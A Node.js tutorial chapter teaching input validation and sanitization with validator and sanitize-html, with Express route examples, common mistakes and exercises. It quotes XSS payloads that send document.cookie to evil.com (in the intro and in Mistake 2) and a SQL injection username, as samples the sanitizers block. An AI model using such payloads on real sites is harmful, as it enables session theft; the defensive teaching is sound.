# 75 — Input validation and sanitization

## What is this?

**Validation** is checking that data has the shape you expect — is this actually an email, is this age a positive number, is this field even present. **Sanitization** is cleaning data so it cannot do harm — stripping out `<script>` tags, escaping quotes, removing characters that could break a database query. Think of a nightclub bouncer: validation is checking the guest list ("are you even supposed to be here?"), sanitization is the pat-down at the door ("you can come in, but that weapon stays outside"). Both happen before the guest — the data — ever reaches the dance floor, which is your application logic.

## Why does it matter for backend development?

Every backend endpoint is a door into your system that the outside world can knock on, and anything that comes through `req.body`, `req.query`, `req.params`, or even HTTP headers is **attacker-controlled** until proven otherwise. Skip validation and a user can send `age: "banana"` and crash your logic, or send a payload ten megabytes larger than expected. Skip sanitization and a user can submit a comment containing `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` that runs in every other visitor's browser (XSS), or a `username` like `admin' --` that alters your SQL query (injection). The single rule every backend developer must internalize is: **never trust user input** — not from a form, not from a mobile app, not from another microservice, not even from an admin panel. Validate and sanitize at the boundary, every single time.

---

## Syntax / API

```js
// npm install validator sanitize-html
// validator  -> string validation/sanitization functions (isEmail, isLength, escape, etc.)
// sanitize-html -> strips/cleans HTML to prevent stored & reflected XSS

const validator = require('validator');       // validation + sanitization toolkit
const sanitizeHtml = require('sanitize-html'); // HTML-aware cleaner

// ── Validation examples — return true/false, never modify the input ────────
validator.isEmail('user@example.com');          // → true
validator.isEmail('not-an-email');              // → false
validator.isLength('hello', { min: 2, max: 10 }); // → true, length between 2-10
validator.isAlphanumeric('abc123');             // → true, only letters/numbers
validator.isInt('42', { min: 1, max: 100 });    // → true, integer in range
validator.isStrongPassword('P@ssw0rd123', {     // → true if it meets all rules
  minLength: 8, minUppercase: 1, minNumbers: 1, minSymbols: 1,
});

// ── Sanitization examples — return a CLEANED version of the input ──────────
validator.normalizeEmail('User@Example.COM');   // → 'user@example.com'
validator.escape('<script>alert(1)</script>');  // → '&lt;script&gt;alert(1)&lt;/script&gt;'
validator.trim('  hello  ');                    // → 'hello'
validator.blacklist('abc123!!', '!');           // → 'abc123' (removes given chars)

// ── HTML sanitization — for rich text fields (blog posts, comments) ────────
const dirtyHtml = '<p>Nice post</p><script>stealCookies()</script>';
const cleanHtml = sanitizeHtml(dirtyHtml, {
  allowedTags: ['p', 'b', 'i', 'em', 'strong', 'a'], // only these tags survive
  allowedAttributes: { a: ['href'] },                 // only href allowed on <a>
});
// → '<p>Nice post</p>'  — the <script> tag is completely removed
```

---

## How it works — line by line

`validator` works on **strings only** — every function either answers a yes/no question about a string (`isEmail`, `isInt`, `isLength`) or returns a transformed string (`escape`, `trim`, `normalizeEmail`). It never throws — a bad input to `isEmail()` just returns `false`, so you are expected to check the boolean yourself and reject the request if it fails.

`sanitize-html` is different — it does not validate, it **rewrites**. You give it a string of HTML and a list of tags/attributes you consider safe. It parses the HTML into a tree, walks through every element, and deletes anything not on your allow-list — including entire `<script>` blocks, `onclick` attributes, and `javascript:` URLs. The output is HTML that is safe to render in a browser because anything dangerous was stripped, not just detected.

The general flow on any backend route looks like this:

```
Request arrives
      │
      ▼
1. VALIDATE  →  Is this even the right shape? (email format, required fields, length, type)
      │             If invalid → reject immediately with 400, do NOT proceed
      ▼
2. SANITIZE  →  Clean the data so it is safe to store/display (strip HTML, escape, trim)
      │
      ▼
3. USE       →  Only now does the data touch your database, your HTML templates, your logs
```

Validation answers "should I accept this?" Sanitization answers "how do I make this safe to keep?" You almost always need both — validating alone doesn't stop a *valid-looking* string from containing a script tag, and sanitizing alone doesn't stop a request missing a required field.

---

## Example 1 — basic

```js
// File: examples/validate-signup.js
const validator = require('validator'); // string validation + sanitization library

// Pretend this came straight from req.body — untouched, untrusted
const requestBody = {
  email: '  NewUser@Example.COM  ',
  username: '<b>coolUser99</b>',
  age: '25',
};

// ── Step 1: VALIDATE — reject the request if anything looks wrong ──────────
const errors = []; // collect all problems instead of stopping at the first one

if (!validator.isEmail(requestBody.email.trim())) {
  errors.push('Email is not valid'); // catches typos like "user@@example.com"
}

if (!validator.isLength(requestBody.username, { min: 3, max: 20 })) {
  errors.push('Username must be 3-20 characters'); // guards against empty/huge usernames
}

if (!validator.isInt(requestBody.age, { min: 13, max: 120 })) {
  errors.push('Age must be a whole number between 13 and 120'); // rejects "abc", "-5", "999"
}

if (errors.length > 0) {
  console.log('Rejected:', errors); // in a real route this would be a 400 response
  process.exit(0); // stop here — never let bad data reach the database
}

// ── Step 2: SANITIZE — clean the data before storing it ────────────────────
const cleanEmail = validator.normalizeEmail(requestBody.email.trim()); // lowercase, trimmed
const cleanUsername = validator.escape(requestBody.username);          // <b> becomes &lt;b&gt;
const cleanAge = parseInt(requestBody.age, 10);                        // string "25" → number 25

console.log({ cleanEmail, cleanUsername, cleanAge });
// → { cleanEmail: 'newuser@example.com', cleanUsername: '&lt;b&gt;coolUser99&lt;/b&gt;', cleanAge: 25 }
```

---

## Example 2 — real world backend use case

```js
// File: src/routes/comments.js
// A comment submission endpoint — the classic place stored XSS attacks happen.
// Users submit rich-ish text (bold, links) but must NEVER be able to inject <script>.

const express = require('express');
const validator = require('validator');
const sanitizeHtml = require('sanitize-html');
const router = express.Router();

// Reusable sanitize-html config — only a tiny allow-list of "safe" formatting tags
const commentSanitizeOptions = {
  allowedTags: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'], // no <script>, <iframe>, etc.
  allowedAttributes: { a: ['href'] },                       // <a> can only have href
  allowedSchemes: ['http', 'https'],                        // blocks javascript: URLs in href
};

router.post('/posts/:postId/comments', async (req, res) => {
  const { postId } = req.params;                 // route param — string, needs validation too
  const { body, authorEmail } = req.body;         // raw, untrusted request body

  // ── VALIDATE the route param ──────────────────────────────────────────────
  if (!validator.isUUID(postId)) {
    return res.status(400).json({ error: 'Invalid post id' }); // reject malformed ids early
  }

  // ── VALIDATE required fields exist and are reasonable ─────────────────────
  if (typeof body !== 'string' || !validator.isLength(body, { min: 1, max: 2000 })) {
    return res.status(400).json({ error: 'Comment must be 1-2000 characters' });
  }

  if (!validator.isEmail(authorEmail || '')) {
    return res.status(400).json({ error: 'A valid author email is required' });
  }

  // ── SANITIZE before it ever touches the database ──────────────────────────
  const safeBody = sanitizeHtml(body, commentSanitizeOptions); // strips scripts/iframes/etc.
  const safeEmail = validator.normalizeEmail(authorEmail);      // consistent lowercase form

  // At this point safeBody is safe to store AND safe to render directly in HTML later —
  // sanitize-html already removed anything that could execute in a browser.
  const savedComment = await dbConnection.query(
    'INSERT INTO comments (post_id, author_email, body) VALUES ($1, $2, $3) RETURNING id',
    [postId, safeEmail, safeBody] // parameterized query — see Topic 76 for SQL injection
  );

  res.status(201).json({ id: savedComment.rows[0].id, body: safeBody });
});

module.exports = router;
```

---

## Common mistakes

### Mistake 1 — Trusting client-side validation as the only line of defense

```js
// ❌ WRONG — the frontend form has required="true" and type="email",
// so the server just trusts whatever arrives and saves it directly.
app.post('/signup', async (req, res) => {
  const { email, username } = req.body;
  await dbConnection.query(
    'INSERT INTO users (email, username) VALUES ($1, $2)',
    [email, username] // attacker can bypass the browser entirely with curl/Postman
  );
  res.status(201).send('OK');
});

// ✅ CORRECT — the server re-validates everything, because HTML attributes
// like "required" only affect the browser UI, never a raw HTTP request.
const validator = require('validator');

app.post('/signup', async (req, res) => {
  const { email, username } = req.body;

  if (!validator.isEmail(email || '')) {
    return res.status(400).json({ error: 'Invalid email' }); // server-side check, always runs
  }
  if (!validator.isLength(username || '', { min: 3, max: 20 })) {
    return res.status(400).json({ error: 'Invalid username' });
  }

  await dbConnection.query(
    'INSERT INTO users (email, username) VALUES ($1, $2)',
    [validator.normalizeEmail(email), validator.escape(username)]
  );
  res.status(201).send('OK');
});
```

### Mistake 2 — Using a blacklist regex instead of an allow-list sanitizer for HTML

```js
// ❌ WRONG — trying to hand-roll XSS protection with a regex that removes "<script>"
// is a losing game — there are dozens of ways to smuggle executable HTML past it.
function sanitizeComment(input) {
  return input.replace(/<script.*?>.*?<\/script>/gi, ''); // misses <img onerror=...>,
}                                                          // <svg onload=...>, <a href="javascript:...">, etc.

const attack = '<img src=x onerror="fetch(\'https://evil.com/steal?c=\'+document.cookie)">';
console.log(sanitizeComment(attack));
// → still contains the full onerror payload — the regex never matched <img>

// ✅ CORRECT — use a battle-tested allow-list library that parses real HTML
const sanitizeHtml = require('sanitize-html');

function sanitizeComment(input) {
  return sanitizeHtml(input, {
    allowedTags: ['b', 'i', 'em', 'strong'], // only text-formatting tags survive
    allowedAttributes: {},                    // no attributes allowed at all — no onerror, no href tricks
  });
}

console.log(sanitizeComment(attack)); // → '' — the entire <img> tag is removed, not just <script>
```

### Mistake 3 — Validating type but forgetting length/size limits

```js
// ❌ WRONG — checks that "bio" is a string, but never limits how long it can be.
// An attacker sends a 50 MB string as their bio and either crashes the process
// (out of memory) or fills up the database column.
app.post('/profile', (req, res) => {
  const { bio } = req.body;
  if (typeof bio !== 'string') {
    return res.status(400).json({ error: 'bio must be a string' });
  }
  userProfile.bio = bio; // no upper bound — a denial-of-service risk
  res.send('Saved');
});

// ✅ CORRECT — always pair a type check with a length/size boundary
const validator = require('validator');

app.post('/profile', (req, res) => {
  const { bio } = req.body;
  if (typeof bio !== 'string' || !validator.isLength(bio, { max: 500 })) {
    return res.status(400).json({ error: 'bio must be a string up to 500 characters' });
  }
  userProfile.bio = validator.escape(bio); // bounded AND sanitized before storing
  res.send('Saved');
});
```

---

## Practice exercises

### Exercise 1 — easy

Write a function `validateRegistration(requestBody)` that takes an object shaped like `{ email, password, age }` and returns an object `{ valid: boolean, errors: string[] }`. Using the `validator` package:
1. `email` must be a valid email address
2. `password` must be at least 8 characters long
3. `age` must be an integer between 13 and 120

Test it with a valid input and at least two invalid inputs, printing the result each time.

```js
// Write your code here
```

---

### Exercise 2 — medium

Build an Express route `POST /feedback` that accepts `{ authorName, message }` in the request body and:
1. Rejects the request with a 400 status if `authorName` is missing or not between 2 and 50 characters
2. Rejects the request with a 400 status if `message` is missing, not a string, or longer than 1000 characters
3. Sanitizes `authorName` using `validator.escape()` before using it anywhere
4. Sanitizes `message` using `sanitize-html` with an allow-list of only `['b', 'i', 'em', 'strong', 'p']` and no attributes at all
5. On success, responds with `201` and the cleaned `{ authorName, message }`

Test it by sending a payload where `message` contains an `<img onerror=...>` XSS attempt and confirm the response no longer contains the attack.

```js
// Write your code here
```

---

### Exercise 3 — hard

Build a reusable validation/sanitization middleware factory called `createValidator(schema)` where `schema` is an object describing each field, for example:

```js
const schema = {
  email:    { type: 'email', required: true },
  username: { type: 'string', required: true, minLength: 3, maxLength: 20, sanitize: 'escape' },
  bio:      { type: 'string', required: false, maxLength: 500, sanitize: 'html' },
  age:      { type: 'int', required: true, min: 13, max: 120 },
};
```

`createValidator(schema)` should return an Express middleware function `(req, res, next)` that:
1. Loops over every field in the schema and checks it against `req.body`
2. For `required: true` fields that are missing, collects an error
3. Validates the field according to its `type` (`email`, `string`, `int`) using `validator`
4. Applies the field's `sanitize` rule (`'escape'` → `validator.escape`, `'html'` → `sanitize-html` with a safe allow-list) and overwrites `req.body[field]` with the cleaned value
5. If any errors were collected, responds with `400 { errors: [...] }` and does not call `next()`
6. If everything passes, calls `next()` so the route handler receives a fully validated and sanitized `req.body`

Wire it into a dummy `POST /users` route using the schema above and test with both a passing and a failing payload.

```js
// Write your code here
```

---

## Quick reference cheat sheet

```
GOLDEN RULE
  Never trust ANY input: req.body, req.query, req.params, headers, even "internal" services.
  Validate first (reject bad shape), sanitize second (clean what remains), then use it.

VALIDATOR.JS — validation (returns true/false)
  validator.isEmail(str)                → checks email format
  validator.isLength(str, {min, max})   → checks string length range
  validator.isInt(str, {min, max})      → checks integer + range (input must be a string!)
  validator.isAlphanumeric(str)         → only letters/numbers
  validator.isUUID(str)                 → valid UUID format (great for route params)
  validator.isURL(str)                  → valid URL format
  validator.isStrongPassword(str, opts) → length/case/number/symbol requirements

VALIDATOR.JS — sanitization (returns a cleaned string)
  validator.trim(str)            → removes leading/trailing whitespace
  validator.escape(str)          → converts <, >, &, ', " to HTML entities (prevents XSS in plain text)
  validator.normalizeEmail(str)  → lowercases + standardizes email format
  validator.blacklist(str, chars)→ removes specific characters

SANITIZE-HTML — for rich text (comments, blog posts, bios)
  sanitizeHtml(dirtyHtml, { allowedTags, allowedAttributes, allowedSchemes })
  → parses real HTML and REMOVES anything not on the allow-list
  → catches <script>, onerror=, onclick=, javascript: URLs — things regex misses
  → default with NO options strips ALL tags (safest possible default)

DOMPURIFY
  → same idea as sanitize-html but designed to also run in the BROWSER (client-side)
  → on the server, prefer sanitize-html; DOMPurify needs a DOM (jsdom) in Node

ORDER OF OPERATIONS
  1. VALIDATE  → reject malformed/missing/oversized input with 400, stop immediately
  2. SANITIZE  → escape or strip dangerous content from what remains
  3. USE       → only now pass data to your database, templates, or logs

NEVER DO
  Trust client-side "required"/type="email" as your only check     → bypassed with curl/Postman
  Hand-roll XSS protection with a regex blacklist                  → always incomplete
  Validate type but skip length/size limits                        → DoS via oversized payloads
  Sanitize AFTER storing in the database                           → stored XSS already happened
  Reuse the same allow-list for admin content and public comments  → different trust levels need different rules
```

---

## Connected topics

- **56 — Request validation** — Joi/Zod/express-validator are schema-based validation libraries that formalize the patterns shown here for entire request bodies, not just single fields.
- **76 — SQL injection prevention** — parameterized queries are the sanitization step specific to database access, working alongside the general input cleaning covered in this topic.
- **78 — XSS, CSRF, Clickjacking** — helmet.js and Content-Security-Policy headers are a second defensive layer that limits the damage even if a malicious script slips past sanitization.
